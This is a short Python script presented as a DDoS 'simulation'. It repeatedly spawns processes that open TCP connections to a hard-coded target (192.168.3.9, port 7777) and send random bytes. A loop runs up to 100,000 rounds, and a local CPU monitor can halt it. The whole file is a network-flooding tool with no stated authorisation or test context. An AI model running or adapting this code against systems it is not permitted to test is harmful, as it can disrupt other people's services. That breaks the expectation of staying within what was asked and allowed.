import psutil
import time
import multiprocessing
import random
import os
import socket
import hashlib

def simulate_ddos(target_ip, target_port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(1)
        client.connect((target_ip, target_port))
        i = 1
        while i:
            data = os.urandom(1024)
            client.send(data)
            i -= 1
    except Exception as e:
        # print(e)
        pass
    finally:
        client.close()

def monitor_cpu_usage(threshold = 80, stop_event = None):
    while True:
        cpu_usage = psutil.cpu_percent(interval=1)
        # print(cpu_usage)
        if cpu_usage > threshold:
            stop_event.set()
            break
        time.sleep(0.2)

def main(target_ip, target_port, max_process=10, threshold=80):
    stop_event = multiprocessing.Event()
    cpu_monitor_process = multiprocessing.Process(target=monitor_cpu_usage, args=(threshold, stop_event))
    cpu_monitor_process.start()

    process = []
    for _ in range(max_process):
        random_answer = random.randint(0, 1000)
        

        if 0 < random_answer < 125:
            p = multiprocessing.Process(target=simulate_ddos, args=(target_ip, target_port))
            p.start()
            process.append(p)
        

    if stop_event.is_set():
        for p in process:
            p.terminate()
        print("stop")

if __name__ == '__main__':
    target_ip = '192.168.3.9'
    target_port = 7777
    i = 100000
    t = time.time()
    while i:
        main(target_ip, target_port)
        if time.time() - t > 100000:
            break
        time.sleep(0.25)
        i -= 1
    print('done')
    
